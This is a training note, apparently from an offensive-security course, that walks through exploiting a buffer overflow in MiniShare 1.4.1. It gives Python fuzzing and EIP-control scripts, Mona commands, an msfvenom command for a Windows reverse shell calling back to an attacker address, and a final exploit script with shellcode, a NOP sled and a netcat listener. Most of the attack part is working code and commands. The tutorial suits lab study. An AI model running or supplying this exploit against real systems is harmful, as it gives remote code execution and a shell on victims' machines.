---
title: "Explotando Un Binario Para Reforzar"
category: ["S4VITAR", "fases", "Buffer Overflow", "Explotando un  binario para reforzar"]
---

To reinforce everything learned so far in this section, in this class we will attempt to exploit another Buffer Overflow. The procedure we will apply is the same, although the initial phase and the way to establish connections in Python will change slightly.

"The attacker does not need access to the victim's debugger. They only need an identical copy of the software to find the weaknesses in their own testing environment. Buffer overflow is a **code** vulnerability, not a **machine** one, so it is reproducible."

Below is the download link for the vulnerable software we will be running:

- **MiniShare**: [https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/](https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/)

### ⚠️ The "Buts" (Modern Protections)

Since we're in 2026, you'll encounter a small problem: **operating system protections**. In the MiniShare video, it's assumed that protections are disabled, but in real life you'll face:

1. **ASLR (Address Space Layout Randomization):** This causes memory addresses (like the `JMP ESP`) to change every time the program restarts.
    
    - _Solution:_ Find the jump in a part of the program that doesn't have ASLR (Mona helps you see this with the `!mona modules` command).
        
2. **DEP/NX (Data Execution Prevention):** Prevents code execution on the stack (where we place our shell).
    
    - _Solution:_ Use a technique called **ROP (Return Oriented Programming)**, which is essentially making a "collage" with legitimate pieces of the program's code to execute what you want.
## 🛠️ Lab and Tools

For this attack, we're using a controlled environment:

- **Victim:** Windows (with MiniShare running).
    
- **Attacker:** Kali Linux.
    
- **Debugger:** Immunity Debugger + **Mona.py** plugin (essential for automation).
    

---

## 1. Fuzzing: Finding the Limit

**Fuzzing** involves sending incremental garbage data until the program doesn't know how to handle it and "breaks."

- **The concept:** MiniShare expects a path in the GET request. If instead of `/index.html` we send 2000 "As," the program tries to fit that giant string into a small memory space (buffer). Without size control, the "As" overflow the buffer and start overwriting other registers.

```
import socket
import sys

# Variables globales de la víctima
ip = "192.168.1.46"
port = 80
total_length = 100

while True:
    try:
        # Configuración del socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5) # Margen de 5 segundos
        s.connect((ip, port))
        s.recv(1024)

        print(f"Enviando {total_length} bytes...")
        
        # Estructura de la petición HTTP maliciosa
        # GET / [buffer de As] HTTP/1.1\r\n\r\n
        payload = b"GET /" + b"A" * total_length + b" HTTP/1.1\r\n\r\n"
        
        s.send(payload)
        s.recv(1024)
        s.close()
        
        total_length += 100
        
    except:
        print(f"\n[!] El servicio ha crasheado con un total de {total_length} bytes enviados")
        sys.exit(1)
```

**Result:** The program gets "Paused" in the debugger. We've caused a crash.



---

## 2. Identify the Offset: Where is EIP?

The **EIP (Extended Instruction Pointer)** register is the most important: it tells the CPU which memory address to execute next.

- **The problem:** We know that 1800 bytes crash the program, but we don't know the exact position within those 1800 bytes that lands in EIP.
    
- **The solution:** We use a unique character pattern (Pattern).
    

1. **Generate pattern:** `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800`
    
2. **Send the pattern** instead of the "A"s.
    
3. **Check EIP:** The debugger will show EIP now contains something like `36684335`.
    
4. **Calculate:** Use `pattern_offset -q 36684335` and it returns: **1787**.
    

> [!IMPORTANT] **The magic formula:** Now we know our payload must be: `Padding (1787 A's) + EIP (4 bytes) + Whatever we want to execute`

---

## 3. Full Control of EIP

To verify the offset, we test with "B"s:

- Send 1787 "A"s (`\x41`) + 4 "B"s (`\x42`).
    
- If Immunity shows EIP as **42424242**, we have full control. Now we can redirect program flow wherever we want.
    
```
import socket
import sys

ip = "192.168.1.46"
port = 80

offset = 1787
# Enviamos 1787 As para llenar el buffer, luego 4 Bs para el EIP
junk = b"A" * offset
eip = b"B" * 4  # Esto debería mostrar 42424242 en Immunity

payload = b"GET /" + junk + eip + b" HTTP/1.1\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload)
s.close()
```


## 4. Bad Character Identification

Certain bytes are "bad" because the program interprets them as commands (e.g., `\x00` is the end of a string in C, `\x0d` is a carriage return). If our shellcode contains these bytes, the exploit will fail.

1. **Generate byte list:** From `\x01` to `\xff`.
    
2. **Send them** right after the EIP.
    
3. **Compare in memory:** Use Mona: `!mona bytearray -cpb "\x00"` then `!mona compare -a [ESP_Address]`.
    
4. **Repeat:** If Mona says `\x0d` is bad, we remove it and compare again until "Unmodified" appears.
    

**Found bad chars:** `\x00`, `\x0d`.

---

## 5. The Master Jump: JMP ESP

Now that we control the EIP, we want it to jump to our shellcode. But the shellcode's address on the stack changes every time the program runs.

- **Trick:** We search the system for a static instruction that says `JMP ESP` (jump to the stack).
    
- **Search with Mona:** `!mona jmp -r esp -cpb "\x00\x0d"`.
    
- **Result:** Mona gives us an address, for example `0x752C3CDA`.
    

> [!WARNING] **Little Endian:** In x86 memory, addresses are written backward. In our Python script, we'll write: `\xda\x3c\x2c\x75`.

---

## 6. Shellcode Generation

Now we create the actual code that will give us a shell using `msfvenom`:

Bash

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -b "\x00\x0d" -f python
```

Note title: Untitled

- `-b`: Specifies the bad chars for the encoder (Shikata Ga Nai) to avoid.
    Final Exploit Script (`exploit.py`):
```
import socket
import sys
from struct import pack

ip = "192.168.1.46"
port = 80

# 1. Relleno hasta el EIP
offset = 1787
junk = b"A" * offset

# 2. Dirección JMP ESP (Little Endian)
# 0x752C3CDA -> \xda\x3c\x2c\x75
eip = pack("<I", 0x752C3CDA)

# 3. NOP Sled (Colchón de seguridad)
nops = b"\x90" * 16

# 4. Shellcode (Copiado de msfvenom)
shellcode = (
    b"\xbb\x0e\x41\xfc\xf5\xda\xcc\xd9\x74\x24\xf4\x5e\x33\xc9"
    b"\xb1\x52\x31\x5e\x12\x83\xee\xfc\x03\x94\x8e\x90\x0f\x02"
    # ... (el resto del código de msfvenom)
)

# Construcción final del paquete
payload = b"GET /" + junk + eip + nops + shellcode + b" HTTP/1.1\r\n\r\n"

try:
    print(f"[*] Enviando payload maligno a {ip}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(payload)
    s.close()
    print("[+] ¡Ataque enviado! Revisa tu listener.")
except:
    print("[!] No se pudo conectar al servicio.")
```
## 7. Assembling the Final Exploit

The final structure we send to the socket is:

1. **Prefix:** `GET /`
    
2. **Junk:** 1787 "As" (padding to reach EIP).
    
3. **EIP:** `\xda\x3c\x2c\x75` (the JMP ESP address).
    
4. **NOP Sled:** `\x90` * 16 (a slide of no-op instructions for stability before the shell).
    
5. **Shellcode:** The bytes generated by msfvenom.
    
6. **Suffix:** `HTTP/1.1\r\n\r\n`
    

---

## 8. BOOM! Execution and Shell

1. Set up a listener in Kali: `nc -lvnp 443`.
    
2. Run the Python script.
    
3. **Flow:** The program hits EIP -> Jumps to the `JMP ESP` address -> `JMP ESP` redirects to the stack -> Lands on the NOPs -> Shell executes.
    



**Success! Full system access.**


## 3. What if You Can't Replicate the Environment? (Blind Attack)

Sometimes you can't download the software. In those cases, attackers use much more complex techniques:

1. **Information Leak:** Look for another small vulnerability that reveals which memory addresses are in use.
    
2. **Brute Force:** If the service restarts automatically, you can crash it hundreds of times testing different addresses (this is very noisy and you'd get caught quickly).
    
3. **Generic Offsets:** There are databases of offsets for very common programs.